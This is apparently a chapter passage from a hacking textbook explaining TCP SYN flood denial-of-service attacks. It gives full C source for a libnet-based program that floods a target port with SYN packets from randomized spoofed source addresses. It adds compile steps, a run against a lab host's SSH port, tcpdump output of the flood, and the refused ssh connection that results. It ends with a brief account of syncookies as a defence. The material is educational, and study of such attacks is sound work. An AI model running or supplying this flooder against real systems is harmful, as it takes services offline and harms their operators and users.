# *__SYN Flooding__*

A _SYN flood_ tries to exhaust states in the TCP/IP stack. Since TCP maintains “reliable” connections, each connection needs to be tracked somewhere. The TCP/IP stack in the _kernel_ handles this, but it has a finite table that can only track so many incoming connections. A SYN flood uses spoofing to take advantage of this limitation.

The attacker floods the victim’s system with many _SYN packets_, using a spoofed nonexistent source address. Since a SYN packet is used to initiate a TCP connection, the victim’s machine will send a _SYN/ACK_ packet to the spoofed address in response and wait for the expected _ACK response_. Each of these waiting, half-open connections goes into a backlog queue that has limited space. Since the spoofed source addresses don’t actually exist, the _ACK responses_ needed to remove these entries from the queue and complete the connections never come. Instead, each half-open connection must time out, which takes a relatively long time.

As long as the attacker continues to flood the victim’s system with spoofed SYN packets, the victim’s backlog queue will remain full, making it nearly impossible for real SYN packets to get to the system and initiate valid TCP/IP connections.

Using the `Nemesis` and `arpspoof` source code as reference, you should be able to write a program that performs this attack. The example program below uses _libnet_ functions pulled from the source code and socket functions previously explained. The _Nemesis_ source code uses the function _libnet_get_prand()_ to obtain pseudo-random numbers for various IP fields. The function _libnet_seed_prand()_ is used to seed the _randomizer_. These functions are similarly used below.

__synflood.c__

```c
#include <libnet.h>

#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.

/* Returns an IP in x.x.x.x notation */
char* print_ip(u_long* ip_addr_ptr) 
{
    return inet_ntoa( *((struct in_addr*)ip_addr_ptr) );
}

int main(int argc, char* argv[]) 
{
    u_long dest_ip;
    u_short dest_port;
    u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

    if (argc < 3)
    {
        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host
    dest_port = (u_short) atoi(argv[2]); // The port

    network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.
    if (network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");
    libnet_init_packet(packet_size, &packet); // Allocate memory for packet.
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand(); // Seed the random number generator.

    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
    while(1) // loop forever (until break by CTRL-C)
    {
        libnet_build_ip(LIBNET_TCP_H,       // Size of the packet sans IP header.
            IPTOS_LOWDELAY,                 // IP tos
            libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
            0,                              // Frag stuff
            libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
            IPPROTO_TCP,                    // Transport protocol
            libnet_get_prand(LIBNET_PRu32), // Source IP (randomized)
            dest_ip,                        // Destination IP
            NULL,                           // Payload (none)
            0,                              // Payload length
            packet);                        // Packet header memory

        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
            dest_port,                      // Destination TCP port
            libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)
            libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
            TH_SYN,                         // Control flags (SYN flag set only)
            libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
            0,                              // Urgent pointer
            NULL,                           // Payload (none)
            0,                              // Payload length
            packet + LIBNET_IP_H);          // Packet header memory

        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

        byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d bytes)", byte_count, packet_size);

        usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.
    }

    libnet_destroy_packet(&packet); // Free packet memory.

    if (libnet_close_raw_sock(network) == -1) // Close the network interface.
        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

    return 0;
}
```

This program uses a _print_ip()_ function to handle converting the u_long type, used by _libnet_ to store IP addresses, to the struct type expected by _inet_ntoa()_. The value doesn’t change the typecasting just appeases the compiler.

The current release of _libnet_ is version _1.1_, which is incompatible with _libnet 1.0_. However, _Nemesis_ and _arpspoof_ still rely on the _1.0_ version of _libnet_, so this version is included in the LiveCD and this is also what we will use in our _synflood_ program. Similar to compiling with _libpcap_, when compiling with _libnet_, the flag `-lnet` is used. However, this isn’t quite enough information for the compiler, as the output below shows.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet
In file included from synflood.c:1:
/usr/include/libnet.h:87:2: #error "byte order has not been specified, you'll"
synflood.c:6: error: syntax error before string constant
reader@hacking:~/booksrc $
</pre>

The compiler still fails because several mandatory define flags need to be set for libnet. Included with _libnet_, a program called _libnet-config_ will output these flags.

<pre style="color: white;">
reader@hacking:~/booksrc $ libnet-config --help
Usage: libnet-config [OPTIONS]
Options:
        [--libs]
        [--cflags]
        [--defines]
reader@hacking:~/booksrc $ libnet-config --defines
-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H
-DLIBNET_LIL_ENDIAN
</pre>

Using the _BASH_ shell’s command substitution in both, these defines can be dynamically inserted into the compile command.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood
synflood.c -lnet
reader@hacking:~/booksrc $ ./synflood
Usage:
./synflood      &lt;target host&gt; &lt;target port&gt;
reader@hacking:~/booksrc $
reader@hacking:~/booksrc $ ./synflood 192.168.42.88 22
Fatal: can't open network interface. -- this program must run as root.
reader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22
SYN Flooding port 22 of 192.168.42.88..
</pre>

In the example above, the host _192.168.42.88_ is a Windows XP machine running an __openssh__ server on port _22_ via _cygwin_. The `tcpdump` output below shows the spoofed SYN packets flooding the host from apparently random IPs. While the program is running, legitimate connections cannot be made to this port.

<pre style="color: white;">
reader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 "host 192.168.42.88"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S
751659999:751659999(0) win 14609
17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S
139725579:139725579(0) win 64357
17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S
322318966:322318966(0) win 43747
17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S
685911671:685911671(0) win 62957
17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S
71363071:71363071(0) win 30490
17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S
1420507902:1420507902(0) win 53397
17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S
2144342837:2144342837(0) win 10594
17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S
1185734766:1185734766(0) win 57243
17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S
1825734966:1825734966(0) win 43454
17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S
1042470133:1042470133(0) win 7087
17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S
1767717206:1767717206(0) win 50156
17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S
2127701542:2127701542(0) win 23682
17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S
2069757602:2069757602(0) win 4767
17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S
1429854465:1429854465(0) win 2092
17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S
1524034954:1524034954(0) win 26970
15 packets captured
30 packets received by filter
0 packets dropped by kernel
reader@hacking:~/booksrc $ ssh -v 192.168.42.88
OpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.
debug1: connect to address 192.168.42.88 port 22: Connection refused
ssh: connect to host 192.168.42.88 port 22: Connection refused
reader@hacking:~/booksrc $
</pre>

Some operating systems (for example, Linux) use a technique called _syncookies_ to try to prevent SYN flood attacks. The TCP stack using _syncookies_ adjusts the initial acknowledgment number for the responding _SYN/ACK_ packet using a value based on host details and time (to prevent _replay attacks_). The TCP connections don’t actually become active until the final ACK packet for the TCP handshake is checked. If the sequence number doesn’t match or the ACK never arrives, a connection is never created. This helps prevent spoofed connection attempts, since the ACK packet requires information to be sent to the source address of the initial SYN packet.